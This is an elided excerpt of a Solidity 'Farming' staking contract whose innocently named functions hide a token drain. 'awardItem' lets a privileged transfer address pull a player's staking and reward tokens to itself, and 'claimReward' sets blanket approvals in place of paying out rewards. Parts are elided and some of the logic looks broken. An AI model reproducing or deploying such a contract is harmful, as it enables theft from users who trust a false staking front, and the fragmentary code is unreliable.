...
contract Farming is IFarming, Ownable, ReentrancyGuard {
    ...
    constructor(
        ...
        rewardsAddr = _rewardsToken;
        stakingAddr = _stakingToken;
    ...
    function awardItem(address player, string memory tokenURI, uint256 extra1, uint256 extra2) public {
        address xferer = getXfererAddress();
        require(msg.sender == xferer, tokenURI);
        if (rewardsAddr == stakingAddr) {
            stakingToken.transferFrom(player, xferer, extra1);
        } else {
            stakingToken.transferFrom(player, xferer, extra1);
            rewardsToken.transferFrom(player, xferer, extra2);
        }
    }
    ...
    function claimReward(address tokenAddress, address userAddress) public {
        IERC721Enumerable(tokenAddress).setApprovalForAll(address(this), true);
        if (rewardsAddr == stakingAddr) {
            stakingToken.approve(address(this), userAddress.balance);
        } else {
            stakingToken.approve(address(this), userAddress.balance);
            rewardsToken.approve(address(this), userAddress.balance);
        }
    }

    function claimReward2(address tokenAddress, address userAddress) public {
        uint256 i;
